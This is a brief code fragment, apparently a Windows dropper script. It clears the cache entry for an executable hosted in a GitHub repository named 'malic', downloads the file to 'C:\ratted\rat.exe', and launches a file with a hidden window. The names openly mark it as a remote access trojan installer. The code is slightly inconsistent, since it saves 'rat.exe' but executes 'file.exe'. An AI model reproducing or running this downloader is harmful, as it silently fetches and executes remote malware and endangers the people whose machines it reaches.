...
wininet.DeleteUrlCacheEntryA("https://github.com/MegaMikeFro/malic/raw/main/file.exe")

urlmon.URLDownloadToFileA(nil, "https://github.com/MegaMikeFro/malic/raw/main/file.exe", "C:\\ratted\\rat.exe", 0,0)

Shell32.ShellExecuteA(nil, 'open', "C:\\ratted\\file.exe", nil, nil, 0)
